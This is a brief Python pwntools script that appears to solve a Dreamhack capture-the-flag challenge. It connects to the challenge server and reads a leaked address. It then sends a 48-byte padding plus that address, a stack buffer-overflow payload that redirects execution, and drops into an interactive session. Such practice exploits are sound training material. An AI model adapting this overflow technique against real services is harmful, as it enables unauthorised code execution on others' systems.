from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 12957
r = remote(HOST, PORT)

r.recvuntil(b'address): ')
flag = int(r.recvline().strip().decode(), 16)
r.sendline(b'A'*48 + p64(flag))

r.interactive()